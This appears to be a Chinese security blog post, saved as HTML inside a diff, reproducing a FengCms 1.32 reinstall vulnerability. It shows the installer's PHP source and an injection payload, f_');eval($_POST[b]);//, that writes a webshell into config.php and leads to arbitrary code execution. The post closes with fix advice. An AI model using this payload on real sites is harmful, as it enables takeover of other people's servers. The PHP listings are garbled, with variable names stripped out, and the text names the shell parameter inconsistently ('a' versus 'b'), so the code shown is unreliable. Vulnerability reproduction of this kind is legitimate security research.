@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>fengcms1.32 重装漏洞 | shackle</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <meta name="keywords" content="漏洞复现" />
+  
+  
+  
+  
+  <meta name="description" content="FengCms1.32 重装漏洞FengCms基于PHP+MYSQL开发。是一款开源的网站内容管理系统。系统支持自由订制模型，自由标签系统，使其更加的灵活，可以用FengCms可以打造任意展示模型。 漏洞简介及危害 本次漏洞出现在CMS的安装上，在配置文件中过滤不严禁，在安装过程中，可以插入恶意代码，从而执行任意命令，甚至直接获取Webshell，危害较大。 影响版本 FengCms1.32 实验">
+<meta name="keywords" content="漏洞复现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="FengCms1.32 重装漏洞">
+<meta property="og:url" content="https://shackles.top/2017/10/19/FengCms1.32 重装漏洞/index.html">
+<meta property="og:site_name" content="shackle">
+<meta property="og:description" content="FengCms1.32 重装漏洞FengCms基于PHP+MYSQL开发。是一款开源的网站内容管理系统。系统支持自由订制模型，自由标签系统，使其更加的灵活，可以用FengCms可以打造任意展示模型。 漏洞简介及危害 本次漏洞出现在CMS的安装上，在配置文件中过滤不严禁，在安装过程中，可以插入恶意代码，从而执行任意命令，甚至直接获取Webshell，危害较大。 影响版本 FengCms1.32 实验">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://p6hx7t2q4.bkt.clouddn.com/blog/180401/AIakC5FdGL.png?imageslim">
+<meta property="og:image" content="http://p6hx7t2q4.bkt.clouddn.com/blog/180401/51cc51fkJa.png?imageslim">
+<meta property="og:image" content="http://p6hx7t2q4.bkt.clouddn.com/blog/180401/1HkJ57GBcd.png?imageslim">
+<meta property="og:image" content="http://p6hx7t2q4.bkt.clouddn.com/blog/180401/BEFJJ544k3.png?imageslim">
+<meta property="og:updated_time" content="2018-04-01T13:52:43.660Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="FengCms1.32 重装漏洞">
+<meta name="twitter:description" content="FengCms1.32 重装漏洞FengCms基于PHP+MYSQL开发。是一款开源的网站内容管理系统。系统支持自由订制模型，自由标签系统，使其更加的灵活，可以用FengCms可以打造任意展示模型。 漏洞简介及危害 本次漏洞出现在CMS的安装上，在配置文件中过滤不严禁，在安装过程中，可以插入恶意代码，从而执行任意命令，甚至直接获取Webshell，危害较大。 影响版本 FengCms1.32 实验">
+<meta name="twitter:image" content="http://p6hx7t2q4.bkt.clouddn.com/blog/180401/AIakC5FdGL.png?imageslim">
+  
+    <link rel="alternate" href="/atom.xml" title="shackle" type="application/atom+xml">
+  
+
+  
+
+  <link rel="icon" href="/css/images/mylogo1.jpg">
+  <link rel="apple-touch-icon" href="/css/images/mylogo1.jpg">
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
+  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+  <style type="text/css">
+/*    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}*/
+
+
+  </style>
+  <link rel="stylesheet" href="/css/style.css">
+
+  <script src="/js/jquery-3.1.1.min.js"></script>
+  <script src="/js/bootstrap.js"></script>
+
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.css" >
+
+  
+    <link rel="stylesheet" href="/css/dialog.css">
+  
+
+  
+
+  
+    <link rel="stylesheet" href="/css/header-post.css" >
+  
+
+  
+  
+  
+
+</head>
+
+
+
+  <body data-spy="scroll" data-target="#toc" data-offset="50">
+
+
+  
+  <div id="container">
+    <div id="wrap">
+      
+        <header>
+
+    <div id="allheader" class="navbar navbar-default navbar-static-top" role="navigation">
+        <div class="navbar-inner">
+          
+          <div class="container"> 
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+              <span class="sr-only">Toggle navigation</span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+            </button>
+
+            
+              <a class="brand" style="
+                 margin-top: 0px;"  
+                href="#" data-toggle="modal" data-target="#myModal" >
+                  <img width="124px" height="124px" alt="Hike News" src="/css/images/mylogo1.jpg">
+              </a>
+            
+            
+            <div class="navbar-collapse collapse">
+              <ul class="hnav navbar-nav">
+                
+                  <li> <a class="main-nav-link" href="/">首页</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/archives">归档</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/categories">分类</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/tags">标签</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/about">关于</a> </li>
+                
+                  <li><div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="请输入关键词..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(无标题)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+<script src="/js/insight.js"></script>
+
+</div></li>
+            </div>
+          </div>
+                
+      </div>
+    </div>
+
+</header>
+
+
+
+      
+            
+      <div id="content" class="outer">
+        
+          <section id="main" style="float:none;"><article id="post-FengCms1.32 重装漏洞" style="width: 75%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" class="article-title" itemprop="name">
+      FengCms1.32 重装漏洞
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2017/10/19/FengCms1.32 重装漏洞/" class="article-date">
+	  <time datetime="2017-10-19T15:53:56.000Z" itemprop="datePublished">2017-10-19</time>
+	</a>
+
+      
+      
+
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="FengCms1-32-重装漏洞"><a href="#FengCms1-32-重装漏洞" class="headerlink" title="FengCms1.32 重装漏洞"></a>FengCms1.32 重装漏洞</h2><p>FengCms基于PHP+MYSQL开发。是一款开源的网站内容管理系统。系统支持自由订制模型，自由标签系统，使其更加的灵活，可以用FengCms可以打造任意展示模型。</p>
+<p><strong>漏洞简介及危害</strong></p>
+<p>本次漏洞出现在CMS的安装上，在配置文件中过滤不严禁，在安装过程中，可以插入恶意代码，从而执行任意命令，甚至直接获取Webshell，危害较大。</p>
+<p><strong>影响版本</strong></p>
+<p>FengCms1.32</p>
+<h4 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h4><h4 id="步骤1：了解漏洞原理"><a href="#步骤1：了解漏洞原理" class="headerlink" title="步骤1：了解漏洞原理"></a>步骤1：了解漏洞原理</h4><p>本次漏洞的代码漏洞入口在<code>install/index.php</code>中，代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line">header(<span class="string">"Content-type:text/html;charset=utf-8"</span>);</span><br><span class="line"></span><br><span class="line">define(<span class="string">"TPL_INCLUDE"</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义当前路径</span></span><br><span class="line">define(<span class="string">'ABS_PATH'</span>,dirname(<span class="keyword">__FILE__</span>));</span><br><span class="line">define(<span class="string">'ROOT_PATH'</span>,dirname(ABS_PATH));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(![<span class="string">'step'</span>])[<span class="string">'step'</span>]=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">=ROOT_PATH.<span class="string">'/config.php'</span>;</span><br><span class="line">=ABS_PATH.<span class="string">'/install.sql'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(file_exists(ROOT_PATH.<span class="string">'/upload/INSTALL'</span>))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'[removed]alert("系统已安装，如需要重新安装，请手工删除upload目录下的INSTALL文件！");[removed]'</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;meta http-equiv="refresh" content="0;url=/"&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>([<span class="string">'step'</span>])&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">'1'</span>: <span class="comment">//安装许可协议</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">include</span> ABS_PATH.<span class="string">"/step/step1.php"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">'2'</span>: <span class="comment">//检查安装环境是否满足要求</span></span><br><span class="line"></span><br><span class="line">          = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">if</span>(extension_loaded(<span class="string">'gd'</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(function_exists(<span class="string">'imagepng'</span>))  .= <span class="string">'png'</span>;</span><br><span class="line">            <span class="keyword">if</span>(function_exists(<span class="string">'imagejpeg'</span>))  .= <span class="string">' jpg'</span>;</span><br><span class="line">            <span class="keyword">if</span>(function_exists(<span class="string">'imagegif'</span>))  .= <span class="string">' gif'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">         = <span class="string">'0'</span>;</span><br><span class="line">        <span class="keyword">if</span>(extension_loaded(<span class="string">'json'</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(function_exists(<span class="string">'json_decode'</span>) &amp;&amp; function_exists(<span class="string">'json_encode'</span>))  = <span class="string">'1'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//新加fsockopen 函数判断,此函数影响安装后会员注册及登录操作。</span></span><br><span class="line">        <span class="keyword">if</span>(function_exists(<span class="string">'fsockopen'</span>)) &#123;</span><br><span class="line">             = <span class="string">'1'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">         = preg_match(<span class="string">"/^[0-9.]&#123;7,15&#125;$/"</span>, @gethostbyname(<span class="string">'www.baidu.cn'</span>)) ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//是否满足FengCms安装需求</span></span><br><span class="line"></span><br><span class="line">         = (phpversion() &gt;= <span class="string">'5.2.0'</span> &amp;&amp; extension_loaded(<span class="string">'mysql'</span>) &amp;&amp;  &amp;&amp;  &amp;&amp; ) ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//配置文件是否存在和可写</span></span><br><span class="line"></span><br><span class="line">         = (is_readable() &amp;&amp; is_writable()) ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//上传目录是否可写</span></span><br><span class="line">         = (dir_writeable(ROOT_PATH.<span class="string">"/upload"</span>)) ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//模块导出目录是否可写</span></span><br><span class="line">         = (dir_writeable(ROOT_PATH.<span class="string">"/upload/module"</span>)) ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//前台缓存目录是否可写</span></span><br><span class="line">         = (dir_writeable(ROOT_PATH.<span class="string">"/app/cache"</span>)) ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">include</span> ABS_PATH.<span class="string">"/step/step2.php"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">'3'</span>: <span class="comment">//填写数据库信息</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">include</span> ABS_PATH.<span class="string">"/step/step3.php"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">'4'</span>: <span class="comment">//正在安装</span></span><br><span class="line"></span><br><span class="line">        =@mysql_connect([<span class="string">'host'</span>],[<span class="string">'user'</span>],[<span class="string">'password'</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!)&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'[removed]alert("链接主机失败，请检查主机地址、用户名和密码是否正确！");history.go(-1);[removed]'</span>;</span><br><span class="line">                <span class="keyword">exit</span>();  </span><br><span class="line">        &#125;<span class="keyword">elseif</span>(intval(mysql_get_server_info())&lt;<span class="number">5</span>)&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'[removed]alert("您的MYSQL版本为'</span>. mysql_get_server_info().<span class="string">'，版本太低，不能安装FengCms!");history.go(-1);[removed]'</span>;</span><br><span class="line">                <span class="keyword">exit</span>();  </span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(!mysql_select_db([<span class="string">'dbname'</span>],))&#123;   <span class="comment">//如果数据库不存在，我们就进行创建。</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!mysql_query(<span class="string">"CREATE DATABASE "</span>. [<span class="string">'dbname'</span>] .<span class="string">" default character set utf8;"</span>,))</span><br><span class="line"></span><br><span class="line">                    &#123;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">'[removed]alert("数据库不存在，创建不成功");history.go(-1);[removed]'</span>;</span><br><span class="line"></span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span>(!mysql_select_db([<span class="string">'dbname'</span>],))&#123;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">'[removed]alert("链接数据库失败，请检查数据库是否正确！");history.go(-1);[removed]'</span>;</span><br><span class="line"></span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">include</span> <span class="string">"data.php"</span>;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">include</span> <span class="string">"data.php"</span>;</span><br><span class="line"></span><br><span class="line">           &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">'5'</span>: <span class="comment">//安装完成</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">include</span> ABS_PATH.<span class="string">"/step/step5.php"</span>;</span><br><span class="line">         = fopen(ROOT_PATH.<span class="string">'/upload/INSTALL'</span>,<span class="string">'w'</span>);</span><br><span class="line">        fclose ();</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+<p>上述代码代码首先判断<code>upload/INSTALL</code>文件是否存在，若存在，就弹出JavaScript代码，提示我们需要删除目录下的INSTALL文件，如图：</p>
+<p>但在这里我们直接点击确定即可，可以无视它的提示，即是不删除INSTALL文件，也可以进行安装操作。</p>
+<p>我们再来看看<code>Install/install.php</code>文件，代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   &#125;</span><br><span class="line"><span class="comment">// = fopen(, "w");   //以写入的方式打开config.php这个文件。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>([<span class="string">'install'</span>])&#123;  <span class="comment">//获取用户提交的数据。  </span></span><br><span class="line">=[<span class="string">'host'</span>];  </span><br><span class="line">=[<span class="string">'user'</span>];  </span><br><span class="line">=[<span class="string">'password'</span>];  </span><br><span class="line">=[<span class="string">'dbname'</span>];  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!=@mysql_connect(,,))&#123;  </span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"连接数据库失败！请返回上一页检查连接参数 返回修改"</span>;  </span><br><span class="line">       <span class="keyword">exit</span>();  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">  mysql_query(<span class="string">"set names gb2312"</span>);  <span class="comment">//设置数据库的编码，注意要与前面一致。  </span></span><br><span class="line">   <span class="keyword">if</span>(!mysql_select_db(,))&#123;   <span class="comment">//如果数据库不存在，我们就进行创建。  </span></span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span>(!mysql_query())&#123;  </span><br><span class="line">           <span class="keyword">echo</span> <span class="string">"创建数据库失败，请确认是否有足够的权限！返回修改"</span>;  </span><br><span class="line">           <span class="keyword">exit</span>();  </span><br><span class="line">          &#125;  </span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> file_get_contents();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">exit</span>;</span><br><span class="line">     = fopen(, <span class="string">"w"</span>);   <span class="comment">//以写入的方式打开config.php这个文件。  </span></span><br><span class="line">    fwrite(,);  <span class="comment">//将配置信息写入config.php文件。  </span></span><br><span class="line">    fclose();  </span><br><span class="line">    <span class="keyword">include_once</span>(ABS_PATH.<span class="string">"config.php"</span>);   <span class="comment">//导入配置信息.  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//下面根据你实际的表的结构跟初始化表的数据来写，这些sql语句，我们在导出时可以找到。  </span></span><br><span class="line">   <span class="comment">//新建一个表test1  </span></span><br><span class="line">   [] = <span class="string">"CREATE TABLE `test1` (     </span></span><br><span class="line"><span class="string">                 `id` int(4) NOT NULL auto_increment,  </span></span><br><span class="line"><span class="string">                 `name` varchar(20) character set gb2312 NOT NULL,  </span></span><br><span class="line"><span class="string">                 `major` varchar(40) character set gb2312 NOT NULL,  </span></span><br><span class="line"><span class="string">                  PRIMARY KEY  (`id`)  </span></span><br><span class="line"><span class="string">                  ) ENGINE=InnoDB  DEFAULT CHARSET=gb2312 AUTO_INCREMENT=1;"</span>;  </span><br><span class="line">    <span class="comment">//新建一个表test2  </span></span><br><span class="line">    [] = <span class="string">"CREATE TABLE `test2` (     </span></span><br><span class="line"><span class="string">                 `id` int(4) NOT NULL auto_increment,  </span></span><br><span class="line"><span class="string">                 `name` varchar(20) character set gb2312 NOT NULL,  </span></span><br><span class="line"><span class="string">                 `major` varchar(40) character set gb2312 NOT NULL,  </span></span><br><span class="line"><span class="string">                  PRIMARY KEY  (`id`)  </span></span><br><span class="line"><span class="string">                  ) ENGINE=InnoDB  DEFAULT CHARSET=gb2312 AUTO_INCREMENT=1;"</span>;  </span><br><span class="line">     <span class="comment">//为test1表默认初始化一些数据。  </span></span><br><span class="line">     []=<span class="string">"INSERT INTO `test1` (`name`, `major`) VALUES('张三','电子商务')"</span>;  </span><br><span class="line">     <span class="keyword">foreach</span>( <span class="keyword">as</span> )&#123;  </span><br><span class="line">            <span class="keyword">if</span>(!mysql_query())&#123;      <span class="comment">//依次执行以上的sql语句，就是创建表和初始化数据。  </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"创建表失败或者初始化数据失败"</span>;  </span><br><span class="line">            <span class="keyword">exit</span>();  </span><br><span class="line">           &#125;  </span><br><span class="line">     &#125;  </span><br><span class="line">     mysql_close();  </span><br><span class="line">     <span class="keyword">echo</span> <span class="string">"安装成功"</span>;<span class="comment">//可以做一个跳转到首页。  </span></span><br><span class="line">     <span class="keyword">exit</span>();  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里系统会判断根目录下的config.php文件是否可写，然后将数据使用POST提交方式，注意这里对传入的数值没有任何的过滤和检测，接下来提交给Config.php文件，我们继续查看config.php文件：</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180401/AIakC5FdGL.png?imageslim" alt="mark"></p>
+<p>我们这里就可以构造语句，在其安装时，可以插入Payload，对Config.php写入恶意的代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f_&apos;);eval($_POST[b]);//</span><br></pre></td></tr></table></figure>
+<p>这样我们就可以通过参数<code>a</code> ，去执行任意的代码。</p>
+<h4 id="步骤2：验证漏洞"><a href="#步骤2：验证漏洞" class="headerlink" title="步骤2：验证漏洞"></a>步骤2：验证漏洞</h4><p><strong>注：如果点击确定后页面立即跳到首页，这时因为服务器配置高响应过快，在真实的场景中相应速度会很慢，足够我们输入相关的内容，这里将upload下INSTALL文件删除即可</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/install/index.php</span><br></pre></td></tr></table></figure>
+<p>上述地址是FengCms的安装地址，打开后我们发现系统提示需要删除INSTALL文件，才可安装，通过上一步代码分析，我们得知，此处只是弹窗警示，程序代码仍然会继续执行下去，因此点击确定：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f_&apos;);eval($_POST[b]);//</span><br></pre></td></tr></table></figure>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180401/51cc51fkJa.png?imageslim" alt="mark"></p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180401/1HkJ57GBcd.png?imageslim" alt="mark"></p>
+<p>当点击下一步之后，就安装成功了，将Payload插入到了Config.php文件中。</p>
+<p>接下来访问<code>127.0.0.1</code> ，使用Post方式提交数据<code>a=phpinfo();</code> </p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180401/BEFJJ544k3.png?imageslim" alt="mark"></p>
+<p>。。。</p>
+<p>成功利用了FengCms重装漏洞。</p>
+<p><strong>修复建议</strong></p>
+<ul>
+<li>升级最新版本</li>
+<li>在Post写入时，严格增加过滤</li>
+<li>验证INSTALL文件是否存在，如果存在则跳出安装流程</li>
+</ul>
+<p>参考：FengCms1.32系统重装漏洞导致getshell - 知道创宇 Seebug 漏洞平台<br><a href="https://www.seebug.org/vuldb/ssvid-93224" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-93224</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+        
+	<div id="comment">
+		<!-- 来必力City版安装代码 -->
+		<div id="lv-container" data-id="city" data-uid="MTAyMC8zNTMwOS8xMTg0NQ">
+		<script type="text/javascript">
+		   (function(d, s) {
+		       var j, e = d.getElementsByTagName(s)[0];
+
+		       if (typeof LivereTower === 'function') { return; }
+
+		       j = d.createElement(s);
+		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+		       j.async = true;
+
+		       e.parentNode.insertBefore(j, e);
+		   })(document, 'script');
+		</script>
+		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+		</div>
+		<!-- City版安装代码已完成 -->
+	</div>
+
+
+
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞复现/">漏洞复现</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2018/03/30/ctf-web/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">上一篇</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/10/08/Covolutions Neural Netwrk/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">下一篇</strong>
+      <div class="article-nav-title">Covolutions Neural Netwrk</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+<!-- Table of Contents -->
+
+  <aside id="toc-sidebar">
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    
